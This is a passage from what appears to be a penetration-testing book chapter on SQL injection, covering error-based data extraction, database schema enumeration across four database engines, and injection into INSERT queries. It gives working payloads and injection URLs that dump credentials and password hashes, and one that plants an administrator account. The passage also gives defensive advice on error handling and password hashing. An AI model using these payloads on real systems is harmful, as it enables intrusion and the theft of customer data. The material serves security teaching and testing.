previous one: http://www.victim.com/shop.asp?item=1+group+by+products.id,products.name+having+1=1 by simply repeating this procedure until we get no more errors, we can easily enumerate all columns. tip as you can see from the examples so far, verbose error messages can be extremely useful to an attacker. if you are responsible for a web application, make sure it is configured so that when something goes wrong it returns only a custom html page that contains a very generic error message for the users. detailed error m essages should be available only to the developers and administrators of a web application. error messages in oracle oracle also offers the possibility of extracting data via error messages. depending on the database version, different pl/sql functions in oracle make it is possible to control the content of the error message. the best -known function is utl_inaddr . this function is responsible for the name resolution of hosts: sql> select utl_inaddr.get_host_name(‘victim’) from dual; ora-29257: host victim unknown ora-06512: at “sys.utl_inaddr”, line 4 ora-06512: at “sys.utl_inaddr”, line 35 ora-06512: at line 1 in this case, it is possible to control the content of the error message. whatever is passed to the function is printed in the error message. in ora cle, you can replace every value (e.g. a string) with a select statement. the only limitation is that this select statement must return exactly one column and one row. if not, you will get the error message ora -01427: single -row subquery returns more than one row . this can be used as in the following examples from the sql ∗plus command line: sql> select utl_inaddr.get_host_name( (select username||‘=’||password from dba_users where rownum=1)) from dual; ora-29257: host sys=d4df7931ab130e37 unknown ora-06512: at “sys.utl_inaddr”, line 4 ora-06512: at “sys.utl_inaddr”, line 35 ora-06512: at line 1 sql> select utl_inaddr.get_host_name((select banner from v$version where rownum=1)) from dual; ora-29257: host oracle database 10g release 10.2.0.1.0 – 64bit production unknown ora-06512: at “sys.utl_inaddr”, line 4 ora-06512: at “sys.utl_inaddr”, line 35 ora-06512: at line 1 the utl_inaddr.get_host_name function can now be injected into a vulnerable url. in figure 4.9, the error me ssage contains the current date of the database. figure 4.9 returning the date in an error message now we have the tools necessary to retrieve data from every accessible table, through the use of an injected string such as: ‘ or 1=utl_inaddr.get_host_name((inner))– we just replace the inner select statement with a statement returning a single column and a single row. to bypass the limitation of the single column it is possible to concatenate multiple columns together. the following query returns the name of a user plus his password. both columns are concatenated: select username||‘=’||password from (sele ct rownum r,username,password from dba_users) where r=1 ora-29257: host sys=d4df7931ab130e37 unknown to avoid single quotes in the concatenated string it is possible to use the concat function instead: select concat(concat(username,chr(61)),password) from (select rownum r, username,password from dba_users) where r=2 ora-29257: host system=e45049312a231fd1 unknown it is also possible to bypass the one -row limitation to get multiple rows of information. by using a special sql statement with xml or the special oracle function stragg (11g+) , it is possible to get all rows in one single row. the only limitation is the size of the output (4000 bytes) in both approaches: select xmltransform(sys_xmlagg(sys_xmlgen (username)),xmltype(‘<?xml version=“1.0”?><xsl:stylesheet version=“1.0” xmlns:xsl=“http://www.w3.org/1999/xsl/transform”><xsl:template match=“/”><xsl:for- each select=”/rowset/username”><xsl:value- of select=“text()”/>;</xsl:for each></xsl:template></xsl:stylesheet>’)).getstringval() listagg from all_users; select sys.stragg (distinct username||‘;’) from all_users output: alex;anonymous;apex_public_user;ctxsys;dbsnmp;demo1;dip;dummy;exfsys;flows_030000; flows_files;mddata;mdsys;mgmt_view;monodemo;olapsys;oracle_ocm;ordplugins;ordsys; outln;owbsys;php;plsql;scott;si_informtn_schema;spatial_csw_admin_usr;spatial_wfs_admin_usr;sys;sysman;system;tsmsys;wkproxy;wksys;wk_test;wmsys;x;xdb;xs$null; injecting one of the queries together with utl_inaddr throws an error message containing all usernames, as shown in figure 4.10. figure 4.10 returning multiple rows by default, oracle 11g restricts access to utl_inaddr and all other network packages with a newly introduced access control list (acl) system. in this case, we will get an ora -24247: network access denied by access control list (acl) error message without data in it. in this case, or if the database was hardened and the public grant was revoked from utl_inaddr , we must use other functions. the following oracle functions (granted to public) return error- controllable messages. injecting the following: or 1=ordsys.ord_dicom.getmappingxpath(user,‘a’,‘b’)-- returns the following: ora-53044: invalid tag: victimuser injecting the following: or 1=sys.dbms_aw_xml.readawmetadata(user,‘a’)-- returns the following: ora-29532: java call terminated by uncaught java exception: oracle.awxml.awexception: oracle.awxml.awexception: an error has occurred on the server error clas s: express failure server error descriptions: eng: ora- 34344: analytic workspace victimuser is not attached. injecting the following: or 1= ctxsys.ctx_query.chk_xpath(user,‘a’,‘b’)-- returns the following: ora-20000: oracle text error: drg-11701: thesaurus victimuser does not exist ora-06512: at “ctxsys.drue”, line 160 ora-06512: at “ctxsys.drithsx”, line 538 ora-06512: at line 1 enumerating the database schema you have seen a number of different techniques for extracting data from the r emote database. to illustrate these techniques, we have retrieved only small pieces of information, so now it’s time to extend our scope and see how to use these techniques to obtain larger amounts of data. after all, databases can be huge beasts, containi ng several terabytes of data. to mount a successful attack, and to properly assess the risk that is posed by an sql injection vulnerability, performing a fingerprint and squeezing a few bits of information is not enough: you must show that a skilled and re sourceful attacker is able to enumerate the tables that are present in the database and quickly extract the ones that he is interested in. in this section, a few examples will be illustrated of how you can obtain a list of all databases that are installed on the remote server, a list of all tables of each of those databases, and a list of all columns for each of those tables —in short, how to enumerate the database schema. we will perform this attack by extracting some of the metadata that databases use to o rganize and manage the databases they store. in the examples, we will mostly use union queries, but you obviously can extend the same concepts to all other sql injection techniques. tip to enumerate the tables/columns that are present on the remote databas e, you need to access specific tables that contain the description of the structure of the various databases. this information is usually called metadata (which means “data about other data”). an obvious precondition for this to succeed is that the user performing the queries must be authorized to access such metadata, and this might not always be the case. if the enumeration phase fails, you might have to escalate your privileges to a more powerful user. we will discuss some privilege escalation techniques later in this chapter. sql server let’s go back to our e -commerce application, with our vulnerable asp page that returns the details of a specific article. as a reminder, the page is called with a url such as the following: http://www.victim.com/products.asp?id=12 this url returns a page similar to the one previously shown in figure 4.1, with a nice table with four fields containing both strings and numeric values. the first piece of information that we usually want to extract is a list of the databases that are installed on the remote server. such information is stored in the master..sy sdatabases table, and the list of names can be retrieved with the following query: select name from master..sysdatabases we therefore start by requesting the following url: http://www.victim.com/products.asp?id=12+union+select+null,name,null,null+from+master..sysda tabases the result will be the page shown in figure 4.11. figure 4.11 using union to enumerate all databases installed on the remote database server not bad for a start! the remote application dutifully provided us with the list of the databases. the master database is obviously one of the most interesting, since it contains the metadata that describes all other databases (including the sysdatabases table we just queried!). the e-shop database also looks very promising, as it’s probably the one that contains all the data used by this e -commerce application, includi ng all customer data. the other databases on this list are shipped by default with sql server, and therefore are less interesting. if this query returns a large number of databases and you need to precisely identify which one is being used by the applicati on you are testing, the following query can help you: select db_name() now that we have the name of the databases, it’s time to start enumerating the tables that compose them and that contains the data we are looking for. each database has a table called sysobjects that contains exactly that information. it also contains a lot more data we’re not necessarily interested in, and therefore we need to focus on user -defined objects by specifying that we are only interested in the rows where the type is u . assum ing that we want to delve a little deeper into the contents of the e -shop database, here’s the query to inject: select name from e -shop..sysobjects where xtype=‘u’ the corresponding url is obviously the following: http://www.victim.com/products.aspid=12+un ion+select+null,name,null,null+from+eshop..sysobjects+where+xtype%3d‘u’ -- the page that results will look something like the screenshot shown in figure 4.12. figure 4.12 enumerating all tables of a specifi c database as you can see, there are some interesting tables, with customers and transactions probably being the ones with the most promising contents! to extract those data, the next step is to enumerate the columns of these tables. we will look at two di fferent ways to extract the names of the columns of a given table (e.g. customers ). here is the first one: select name from e- shop..syscolumns where id = (select id frome- shop..sysobjects where name = ‘customers’) in this example, we nest a select query in to another select query. we start by selecting the name field of the e -shops..syscolumns table, which contains all the columns of the e -shop database. because we are only interested in the columns of the customers table, we add a where clause, using the id field, that is used in the syscolumns table to uniquely identify the table that each column belongs to. what’s the right id ? because every table listed in sysobjects is identified by the same id , we need to select the id value of the table whose name is customers , and that is the second select . if you don’t like nested queries and are a fan of joining tables, the following query extracts the same data: select a.name from e -shop..syscolumns a,e- shop..sysobjects b where b.name =‘customers’ and a.id = b.id whichever approach you decide to take, the resultant page will be similar to the screenshot in figure 4.13. figure 4.13 example of a successful enumeration of the columns of a specific table as you can see, we now know the names of the columns of the customers table. we can guess that both login and passwords are of type string , and we can therefore return them with yet another union select , this time using both the type and description fields of the original query. this is performed by the following url: http://www.victim.com/products.aspid=12+union+select+null,login,password,null+from+eshop..customers-- as you can see, this time we use two column names in our injected query. the result, which finally contains the data we were looking for, is in the screenshot shown in figure 4.14. figure 4.14 finally getting the data: username and passwords, in this case! bingo!! however, the result is not just a very long list of use rs. it seems that this application likes to store user passwords in clear text instead of using a hashing algorithm. the same attack sequence could be used to enumerate and retrieve any other table that the user has access to, but having arrived at this point, you might just call the client, tell them they have a huge problem (actually, more than just one), and call it a day . are you owned? how to store passwords in your database the scenario that was just illustrated, in which a few queries have been enoug h to retrieve a list of usernames and passwords unencrypted (in clear text), is not as unusual as you might think. during our penetration tests and security assessments, we (the book’s authors) have come across plenty of cases in which vulnerable applicati ons had passwords and other sensitive data is stored in clear text. the danger of storing users’ passwords in clear text poses other dangers: because human beings have the tendency to reuse the same password for several different online services, a successful attack such as the one described might pose a threat not only to the users’ accounts on victim.com , but also to other areas of their online identity, such as online banking and private e -mail. and victim.com might even be liable for these addit ional break -ins, depending on the specific laws of the country where it resides! up to just some time ago, the recommended approach for storing passwords was a cryptographic hash function . a cryptographic hash function transforms an arbitrary value (in our case, the user’s password) into a fixed -length string (called the hash value ). this function has several mathematical properties, but here we are mostly interested in two of them: • given a hash value, it is extremely difficult to construct a value that generates it. • the probability that two different values generate the same hash value is extremely low. storing the hash value of the password instead of the password itself still allows users to authenticate, because it’s enough to calculate the hash valu e of the password they provide and compare it with the stored hash value. however, it provides a security advantage, because if the list of hash values is captured, the attacker would not be able to convert them back to the original passwords without going through a brute -force attack. adding an additional, random value to the hash input (called a “salt”) also protects the password against precomputation based attacks. unluckily, in the past few years we have witnessed an enormous increase in the computing power available to attackers, mostly thanks to the use of graphical processing units, which allow massively parallelized computations. since all modern general -purpose cryptographic hash functions have been designed for speed, they are inherently vulnerabl e to modern gpu -based brute -force attacks. the answer is using an algorithm that is specifically designed to be computationally very slow and expensive, such as bcrypt or scrypt. bcrypt is an adaptive password hashing algorithm, with a work factor which al lows the user to decide how expensive the hashing computation will be. with a proper tuning of the work factor, any brute -force attack against bcrypt will be several orders of magnitude slower than an attack against md5 or sha256. scrypt is based on the co ncept of “sequential memory -hard functions,” meaning that the hashing is not only cpu intensive but also memory intensive, making things hard even for a custom hardware attack, in which integrated circuits specifically designed for cryptographic brute -force attacks are used. of course, using such algorithms will not protect you against sql injection attacks (fear not —we wrote chapters 8 and 9 for that), but will greatly protect your customers in case the data fall into the wrong hands. more information on bcrypt can be found at www.usenix.org/events/usenix99/provos.html and http://codahale.com/how -to-safely -store -a-password/ , while scrypt is fully described at the address www.tarsnap.com/scrypt.html . scrypt provides a level of security that is even high er than bcrypt, but at the time of writing it is a self -contained executable, making it less -useful compared to bcrypt, which has a set of apis and is supported out -of-the-box by all modern technologies for web application development. whichever you decide to use, you will be a lot more secure than trusting md5 or sha. so you have no excuse: stop using generic hashing algorithms to store your passwords! mysql also on mysql, the technique for enumerating a database and extracting its data follows a hierarchical approach: you start extracting the names of the databases, and then proceed down to tables, columns, and finally the data themself. the first thing you a re usually interested in is the name of the user performing the queries. you can retrieve this with one of the following queries: select user(); select current_user; to list the databases that are present on the remote mysql installation, you can use the following query, if you have administrative privileges: select distinct(db) from mysql.db; if you don’t have administrative privileges, but the remote mysql version is 5.0 or later, you can still obtain the same information using information_schema, by inje cting the following alternative: select schema_name from information_schema.schemata; querying information_schema allows you to enumerate the whole database structure. once you have retrieved the databases, and you have found one of them that looks particularly interesting (e.g. customers_db), you can extract its table names with the following query: select table_schema,table_name from information_schema.tables where table_schema = ‘customers_db’ if you prefer to obtain a list of all the tables of all datab ases, you can simply omit the where clause, but you might want to modify it as follows: select table_schema,table_name from information_schema.tables where table_schema != ‘mysql’ and table_schema != ‘information_schema’ such a query will retrieve all tables except the ones belonging to mysql and information_schema, two built -in databases whose tables you are probably not interested in. once you have the tables it is time to retrieve the columns, again avoiding all entries that belong to mysql and information_schema: select table_schema, table_name, column_name from information_schema.columns where table_schema != ‘mysql’ and table_schema != ‘information_schema’ this query will provide you with a comprehensive view of all databases, tables, and columns, all packaged in one nice table, as you can see in the following example: mysql> select table_schema, table_name, column_name from information_schema.columns where table_schema != ‘mysql’ and table_schema != ‘information_schem a’; +--------------+ ---------------+ --------------- + | table_schema | table_name | column_name | +--------------+ ---------------+ --------------- + | shop | customers | id | | shop | customers | name | | shop | customers | surname | | shop | customers | login | | shop | customers | password | | shop | customers | address | | shop | customers | phone | | shop | customers | email | <snip> as you can see, if your web application allows you to perform a union select , such a query gives you a full description of t he whole database server in one simple shot! alternatively, if you prefer to go the other way around and look for a table that contains a specific column you are interested into, you can use the following query: select table_schema, table_name, column_name from information_schema.columnswhere column_name like ‘password’ or column_name like ‘credit_card’; and you might obtain something such as this: +--------------+ ---------------+ --------------- + |table_schema | table_name | column_name | +--------------+ ---------------+ --------------- + | shop | users | password | | mysql | user | password | | financial| customers | credit_card | +--------------+ ---------------+ --------------- + 2 rows in set (0.03 sec) information_schema does not contain only the structure of the database, but also all the relevant information regarding the privileges of the database users, and the permissions they have been granted. for instance, to list the privileges granted to the various users you can execute the following query: select grantee, privilege_type, is_grantable from information_schema.user_privileges; such a query will return output similar to the following: +---------------------+ ------------------------- +--------------+ | guarantee | privilege_type | is_grantable | +---------------------+ ------------------------- +--------------+ | ‘root’@‘localhost’ | select | yes | | ‘root’@‘localhost’ | insert | yes | | ‘root’@‘localhost’ | update | yes | | ‘root’@‘localhost’ | delete | yes | | ‘root’@‘localhost’ | create | yes | | ‘root’@‘localhost’ | drop | yes | | ‘root’@‘localhost’ | reload | yes | | ‘root’@‘localhost’ | shutdown | yes | | ‘root’@‘localhost’ | process | yes | | ‘root’@‘localhost’ | file | yes | | ‘root’@‘localhost’ | references | yes | | ‘root’@‘localhost’ | index | yes | <snip> if you need to know the privileges granted to users on the different databases, the following query will do the job: select grantee, table_schema, privilege_type from information_schema.schema_privileges unfortunately, information_schema is available only in mysql 5 and later, so if you are dealing with an earlier version the process will be more difficult, as a brute -force attack might be the only way to determine the names of tables and colum ns. one thing you can do (however, it’s a little complicated) is access the files that store the database, import their raw content into a table that you create, and then extract that table using one of the techniques you’ve seen so far. let’s briefly walk through an example of this technique. you can easily find the current database name with the following query: select database() the files for this database will be stored in a directory with the same name as the database itself. this directory will be con tained in the main mysql data directory, which is returned by the following query: select @@datadir each table of the database is contained in a file with the extension myd . for instance, here are some of the myd files of a default mysql database: tables_priv.myd host.myd help_keyword.myd columns_priv.myd db.myd you can extract the contents of a specific table of that database with the following query: select load_file(‘databasename/tablename.myd’) however, without information_schema you will have to brute -force the table name for this query to succeed. also, note that load_file (discussed in more detail in chapter 6 ) only allows you to retrieve a maximum number of bytes that is specified in the @@max_allowed_packet variable, so this technique is not suited for tables that store large amounts of data. postgresql the usual hierarchical approach obviously works for postgresql as well. the list of all databases can be extracted with the following: select datname from pg_database if you want to know which one is the current database, it is easy enough with the following query: select current_database() as for the users, the following query will return the complete list: select usename from pg_user the cu rrent user can be extracted with one of the following queries: select user; select current_user; select session_user; select getpgusername(); four different ways to get the current user? well, there are some minor differences between some of them: session_user returns the user who started the current connection to the database, while current_user and user (they are equivalent) return the current execution context, meaning that this value is the one used for checking permissions. they usually return the same value, unless “set role” has been called at some point. finally, getpgusername() returns the user associated with the current thread. again, it is somewhat unlikely you will get a different result. in order to enumerate all tables in all schemas that are present in the database you are connected to, you can use one of the following queries: select c.relname from pg_catalog.pg_class c left join pg_catalog.pg_namespace n on n.oid = c.relnamespace where c.relkind in (‘r’,’’) and n.nspname not in (‘pg_catalog’, ‘pg_toast’) and pg_catalog.pg_table_is_visible(c.oid) select tablename from pg_tables where tablename not like ‘pg_%’ and tablename not like ‘sql_%’ if you want to extract a list of all columns, you can do so with the following query: select relname, a.attname from pg_class c, pg_namespace n, pg_attribute a, pg_type t where (c.relkind=‘r’) and (n.oid=c.relnamespace) and (a.attrelid=c.oid) and (a.atttypid=t.oid) and (a.attnum>0) and (not a.attisdropped) and (n.nspname ilike ‘public’) this query will extract all columns in the ‘public’ schema. change the last ilike clause if you need to extract the columns of another schema. if you need to find the tables that contain columns you might be interested in (obvious examples: “password” and “passwd”), you can use the following query, modifying the last like clause to fit your needs: select distinct relname from pg_class c, pg_namespace n, pg_attribute a, pg_type t where (c.relkind=‘r’) and (n.oid=c.relnamespace) and (a.attrelid=c.oid) and (a.atttypid=t.oid) and (a.attnum>0) and (not a.attisdropped) and (n.nspname ilike ‘public’) and attname like ‘%password%’ for space reasons, all t he queries that could be useful for enumerating information for a specific technology cannot be included, but some cheat sheets are available in chapter 11. cheat sheets are also available online that can assist you in quickly locating the proper query for handling a specific job on a specific database, such as those found at http://pentestmonkey.net/cheat- sheets/ . oracle the last example we will cover is how to enum erate the database schema when the back -end database server is oracle. an important fact to remember when using oracle is that you will normally be accessing only one database at a time, as databases in oracle are normally accessed via a specific connectio n, and multiple databases accessed by an application will generally have different connections. therefore, unlike sql server and mysql, you won’t be enumerating the databases present when finding the database schema. the first thing you may be interested i n is the list of tables that belong to the current user. in the context of an application, this will generally be the application tables in the database: select table_name from user_tables; you can extend this to look at all of the tables in the database a nd their owners: select owner,table_name from all_tables; you can enumerate some more information about your application tables to determine the number of columns and rows that are present in the tables as follows: select a.table_name||‘[‘||count(∗ )||’]=’||num_rows from user_tab_columns a,user_tables b where a.table_name=b.table_name group by a.table_name,num_rows emp[8]=14 dummy[1]=1 dept[3]=4 salgrade[3]=5 and you can enumerate the same information for all accessible/available tables, including their user s, table names, and the number of rows in these tables as follows: select b.owner||‘.’||a.table_name||‘[’||count( ∗)||‘]=’||num_rows from all_tab_columns a, all_tables b where a.table_name=b.table_name group by b.owner,a.table_name,num_rows finally, you can enumerate the columns and data types in each table as follows, allowing you to get a more complete picture of the database schema: select table_name||‘:’||column_name||‘:’||data_type||‘:’||column_id from user_tab_columns order by table_name,column_id dept:deptno:number:1 dept:dname:varchar2:2 dept:loc:varchar2:3 dummy:dummy:number:1 emp:empno:number:1 emp:ename:varchar2:2 emp:job:varchar2:3 emp:mgr:number:4 emp:hiredate:date:5 emp:sal:number:6 emp:comm:number:7 emp:deptno:number:8 salgrade:grade:number:1 salgrade:losal:number:2 salgrade:hisal:number:3 another thing you may be interested in is obtaining the privileges of the current database user, which you can do as an unprivileged user. the following queries return the privileges of the current user. in o racle, there are four different kinds of privileges ( system, role, table, and column ). to get system privileges for the current user: select ∗ from user_sys_privs; --show system privileges of the current user to get role privileges for the current user: select ∗ from user_role_privs; --show role privileges of the current user to get table privileges for the current user: select ∗ from user_tab_privs; to get column privileges for the current user: select ∗ from user_col_privs; to get the list of all possible privileges you must replace the user string in the preceding queries with all , as follows. to get all system privileges: select ∗ from all_sys_privs; to get all role privileges: select ∗ from all_role_privs; to get all table privileges: select ∗ from all_tab_privs; to get all column privileges: select ∗ from all_col_privs; now that you have a listing of the database schema and some information about your current user, you may be interested in enumerating other information in the database, such as a list of all of the users in the database. the following query returns a list of all users in the database. this query has the advantage that, by default, it can be executed by any user of the database: select username,created from a ll_users order by created desc; scott 04– jan–09 php 04–jan–09 plsql 02– jan–09 monodemo 29– dec–08 demo1 29– dec–08 alex 14– dec–08 owbsys 13– dec–08 flows_030000 13– dec–08 apex_public_user 13– dec–08 you can query additional items as well, depending on the version of the database in use. for example, an unprivileged user in versions up to oracle 10g r2 can retrieve the database usernames and password hashes with the following select statement: select name, password, astatus from sys.user$ where type#>0 and length(password)=16 -- astatus (0=open, 9=locked&expired) sys ad24a888fc3b1be7 0 system bd3d49ad69e3fa34 0 outln 4a3ba55e08595c81 9 you can test or crack the password hashes with publicly available to ols, possibly allowing you to obtain credentials for a privileged database account such as sys. in oracle 11g, oracle has changed the password hashing algorithm in use, and the password hash is now located in a different column—spare4, as follows: select name,spare4 from sys.user$ where type#>0 and length(spare4)=62 sys s:1336fb26acf58354164952e502b4f726ff8b5d382012d2e7b1ec99c426a7 system s:38968e8cec12026112b0010bcba3ecc2fd278afa17ae363fdd74674f2651 if the current user is a privileged one, or access as a p rivileged user has been obtained, you can look for a number of other interesting pieces of information in the database structure. since oracle 10g r2, oracle offers the capability of transparently encrypting columns in the database. normally, only the most important or sensitive tables will be encrypted, and therefore you are interested in finding these tables as follows: select table_name,column_name,encryption_alg,salt from dba_encrypted_columns; table_name column_name encryption_alg salt --------- creditcard ccnr aes256 no creditcard cve aes256 no creditcard valid aes256 no another piece of information that could be useful, if you have a privileged account, is to know what database administrator (dba) accounts exist within the database, as follows: select grantee,granted_role,admin_option,default_role from dba_role_privs where granted_role=‘dba’; tips enumerating a full database by hand can be a very tedious task. although it can be fairly easy to quickly code a small program to perform the task for you (using your favorite scripting language), several free tools are available that automate the process. at the end of this chapter, three of them: sqlmap, bobcat, and bsql will be illustrated. injecting into “insert” queries as mentioned earlier in the chapter, you might have to deal with cases in which the only vulnerable queries are the ones that modify t he data on the database —the risk here is that your attack will corrupt production data. this should rarely be the case, as penetration testing should preferably be performed on test environments, but sometimes reality is different. there are two main scenarios we cover here: in the first one, you have found a way to include in the data you are passing to an insert or an update some information from other tables, and then you use a different part of the application to read that information. an example is an application that allows you to create and manage a personal profile, in which one or more of the fields are vulnerable. if you inject sql code that fetches data from somewhere else in the database (for instance, password hashes), you will then be able to g rab that information by simply viewing the updated profile. another example is an application that has file upload capability, in which the description accompanying the file is vulnerable to sql injection. the second scenario we are going to discuss is one in which the data you are looking for is immediately returned by the query you are injecting into (e.g. through an error message or a timing attack). it is not possible to cover all possible cases and permutations, but we will illustrate examples for both of the aforementioned scenarios to show how such cases can be handled in order to provide some guidance on handling situations you may encounter. in these situations, however, a bit of creativity is often needed. in the following examples we discuss inser t queries in particular, however the same scenarios and techniques also applies to other commands belonging to the data manipulation language (dml), such as update and delete. first scenario: inserting user determined data usually this kind of injection is not too hard to handle, as long as the application is not very picky about the type of data that we are trying to inject. in general, things are relatively easy if the column that we can inject into is not the last one in the table. for instance, consider the following example: insert into table (col1, col2) values (‘injectable’, ‘not injectable’); in this case, the strategy is to close the string passed as the first column, and then to craft the sql code needed to “recreat e” the second column with the data that we are interested in, and then comment out the rest of the query. for example, let’s say that we are submitting a first and a last name, and that the first name is the vulnerable field. the resulting url of the origi nal request would be something like the following: http://www.victim.com/updateprofile.asp?firstname=john&lastname=smith this would translate in the following query: insert into table (firstname, lastname) values (‘john’, ‘smith’) we can therefore inject t he following string as the firstname parameter: john’,(select top 1 name + ‘ | ’ + master.sys.fn_varbintohexstr(password_hash) from sys.sql_logins))-- the resulting query will therefore be the following, with the underlined code being what we have injected : insert into table (firstname, lastname) values (‘john’,(select top 1 name + ‘ | ’ + master.sys.fn_varbintohexstr(password_hash) from sys.sql_logins))-- ‘,‘smith’) what happens here? very simply, we are performing the following actions: • we start with some random value for the first column to insert (“john”) and we close the string with a single quote. • for the second column to insert, we inject a subquery that concatenates in one string the name and hash of the first user of the database ( fn_varbintohexs tr() is used to convert the binary hash into a hexadecimal format) • we close all needed parentheses and comment out the rest of the query, so that whatever we put in the “lastname” field (“smith” in this case) and any other spurious sql code will not get in the way. if we launch this attack, and then we view the profile we have just updated, our last name will look like the following: sa | 0x01004086ceb6370f972f9c9135fb8959e8a78b3f3a3df37efdf3 bang! we have just extracted the “crown jewels” and injected them back into the database itself in a position where we can easily see them! unluckily, things can sometimes be a bit harder, in which case some creativity is needed. a good example of this sce nario (and an instructive lesson of the tricks one often needs to resort to) happened to one of the authors a while ago, during a penetration test of an application that allowed users to upload files to the server and specify their name. the back- end datab ase was mysql, and the vulnerable query was similar to the following: insert into table (col1, col2) values (‘not injectable’, ‘injectable’); the injectable parameter is the last one, which complicates things, as we cannot close one parameter and start crafting the following one from scratch, as we did in the previous example. now we have to deal with a parameter that has been “opened but not yet closed” by the application, and this restricts our possibilities a little bit. the first thought would obviously be to use a subquery and concatenate the result to the user controlled field, as in the following example: insert into table (col1, col2) values (‘foo’,‘bar’ || (select @@version)) -- now, if mysql is in ansi mode (or any other mode that implements pipes_ as_quotes, like db2, oracle, or maxdb), then this works fine. however, this was not the case: when pipes_as_quotes is not implemented (as it is the case in traditional mode), the || operator is parsed as an or logical operator and not as a concatenation op erator. the concat function would be an alternative, as it can be used after values, but it needs to be at the very beginning of the column parameter, as in the following example: insert into table (col1, col2) values (‘foo’, concat(‘bar’,(select @@version)))-- in our case, we are injecting after the opening quote has been used, which means that concat is out of question (now you will probably understand why whether the injectable parameter is the last one makes a non -trivial difference!). the trick here is that in mysql when adding an integer and a char value, the integer has operator precedence and “wins,” as in the following example: mysql> select ‘a’ + 1; +----------+ | ‘a’ + 1 | +----------+ | 1 | +----------+ 1 row in set, 1 warning (0.00 sec) we can u se this trick to extract arbitrary data, convert such data into an integer (unless it’s an integer already), and then “add” it to the initial part of the string under control, as in the following example: insert into table (col1,col2) values (‘foo’, ‘d’ + substring((select @@version),1,1)+’’); the substring() function extracts the first character of @@version (in our case, ‘5’). that character is then “added” to ‘d’, and the result is actually, 5: mysql> select (‘a’ + substring((select @@version),1,1)); +-------------------------------------------+ | (‘a’ + substring((select @@version),1,1)) | +-------------------------------------------+ | 5 | +-------------------------------------------+ 1 row in set, 1 warning (0.00 sec) the last catch was that whitespaces were filtered, but that was easy to overcome by using comments. the actual attack was therefore as follows: insert into table (col1,col2) values (‘foo’, ‘d’+/∗∗/substring((select/∗∗/@@version),1,1)+’’); as for converting non-integer characters, this can be done with the ascii() function: insert into table (col1, col2) values (‘foo’,‘bar’+/∗∗ /ascii(substring(user(),1,1))+’’) insert into table (col1, col2) values (‘foo’,‘bar’+/∗∗ /ascii(substring(user(),2,1))+’’) insert into table (col1, col2) values (‘foo’,‘bar’+/∗∗ /ascii(substring(user(),3,1))+’’) second scenario: generating insert errors in the second scenario, you want to extract information from the database using an insert query, but you want to be able to do that without the query succeeding, in order to avoid tainting the tables of the database or adding unnecessary log entries. a relatively simple situation is when your insert returns an error message with the information you are looking for. let’s imagine that you ar e required to enter your name and age in the web site, and that the name field is injectable. the query will look something like the following: insert into users (name, age) values (‘foo’,10) you can exploit this scenario by injecting in the name column to trigger an error, for instance injecting the following: foo’,(select top 1 name from users where age=@@version))-- what happens here? you inject a subquery that attempts to retrieve a row from the user table, but which fails because @@version is not numer ic, returning the following message: conversion failed when converting the nvarchar value ‘microsoft sql server 2008 (rtm) - 10.0.1600.22 (intel x86) jul 9 2008 14:43:34 copyright (c) 1988 -2008 microsoft corporation standard edition on windows nt 5.2 <x86> (build 3790: service pack 2) ‘ to data type int. nice! the version details have been extracted, but the insert query was not executed. however, things are not always this simple, as the application might not be willing to give us such verbose error messages. in some cases, we might actually need the inner query to succeed instead of failing, in order to obtain the information we are looking for, but still with the outer query (the insert) failing in order to avoid modifying data. for instance, the inner query might be used for a time -based blind injection, which means that depending on the value of some bit the subquery will or will not introduce a time delay. in both cases, the subquery needs to succeed, not fail (but the outer insert must fail). a similar scenario has been recently investigated by mathy vanhoef on mysql. t he overall strategy is based on scalar subqueries , which are subqueries that return a single value as opposed to multiple columns or rows. for instance, consider the following query: select (select column1 from table 1 where column1 = ‘test’) if the inner query returns only one value (or null), the outer query will execute successfully. however, if the inner query returns more than one result, mysql will abort the outer one and provide the following error to the user: error 1242 (21000): subquery returns more than 1 row now, note that even when the outer query is aborted, the inner one has already been successfully executed. this means that if we can inject two nested select queries so that the inner extracts information but the outer is guaranteed to fail, then we are su ccessfully extracting data without allowing the original insert to be executed. the easiest example is to use an inner query that evaluates some condition and then pauses for a few seconds depending on the result: measuring the time between our request and the response we will be able to infer such result. for instance, consider the following query: select (select case when @@version like ‘5.1.56%’ then sleep(5) else ‘somevalue’ end from ((select ‘value1’ as foobar) union (select ‘value2’ as foobar)) alias) the case clause checks the exact version of mysql, and if a specific version is encountered the sleep command is executed for 5 s. this will tell us whether the version is there, but at the same time the union command will ensure that two rows are returne d to the outer select, therefore generating the error. now, let’s assume that we can inject into the following query: insert into table 1 values (‘injectable_parameter’) we can inject the following as the parameter: ‘|| select (select case when @@version like ‘5.1.56%’ then sleep(5) else ‘somevalue’ end from ((select ‘value1’ as foobar) union (select ‘value2’ as foobar)) alias) || ‘ the resulting query would be: insert into table 1 values (‘‘|| select (select case when @@version like ‘5.1.56%’ then sleep(5) else ‘somevalue’ end from ((select ‘value1’ as foobar) union (select ‘value2’ as foobar)) alias) || ’’) what we are doing here is using the concatenation operator ( ||) to inject our nested select query in the string expected by the insert. the query will fingerprint the database version but without actually modifying any data. obviously, timing attacks tend to be very slow when used to extract non- trivial amounts of data: however, if different error messages from the inner query result depending on the condition we check, things can be much faster. the regexp operator can be used for this task, as we can see in the following example query: select (select ‘a’ regexp (select case when <condition> then ‘.∗ ’ else ‘∗’ end (from ((select ‘foo1’ as bar) union (select ‘foo2’ as bar) foobar) if the condition is true, then the ‘. ∗’ valid regular expression is used, two rows are returned to the outermost select, and we receive the usual error: error 1242 (21000): subquery returns more than 1 row however, if the conditi on is false, then regexp is fed ‘ ∗,’ which is not a valid regular expression, and the database server will return the following error instead: error 1139 (42000): got error ‘repetition- operator operand invalid’ from regexp if the web application in the front -end returns different results for these two errors, we can forget the slow time -based approach and start dumping tables at light speed. mathy’s original research covers all the details and provides further examples, and is available at www.mathyvanhoef.com/2011/10/exploiting -insert -into-sql-injections.html. other scenarios there are other cases in which you might use an insert statement in your attack, which ma y not necessarily be related to this being the only type of query you can inject into. for instance, an insert query can be extremely useful when you can use stacked queries and you have managed to extract the table containing the users of the application: if you discovered that such table contains an e- mail address, a hash of the password, and a privileges level where the value zero indicates an administrator, you will probably want to inject something like the following, to get instant privileged access to the application: http://www.victim.com/searchpeople.asp?name=’;insert+into+users(id,pass,privs)+values+(‘atta cker@evil.com’,‘hashpass’,0)-- as you can see, injecting into insert queries is not much more difficult than attacking the more common select one s. depending on the situation, you will only need some extra care in order to avoid side effects such as filling with database with garbage, and exercise some extra creativity in overcoming hurdles such as those discussed. escalating privileges all modern database servers provide their administrators with very granular control over the actions that users can perform. you can carefully manage and 